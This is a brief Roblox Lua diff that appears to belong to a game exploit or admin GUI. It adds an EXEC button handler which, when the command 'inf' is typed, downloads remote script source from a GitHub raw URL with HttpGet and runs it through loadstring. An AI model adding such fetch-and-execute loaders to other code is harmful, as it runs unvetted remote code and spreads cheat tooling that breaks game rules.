@@ -214,6 +214,12 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
     end
 end)
 
+EXECButton.MouseButton1Click:Connect(function()
+	if CMDBox.Text == "inf" then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end
+end)
+
 
 
 
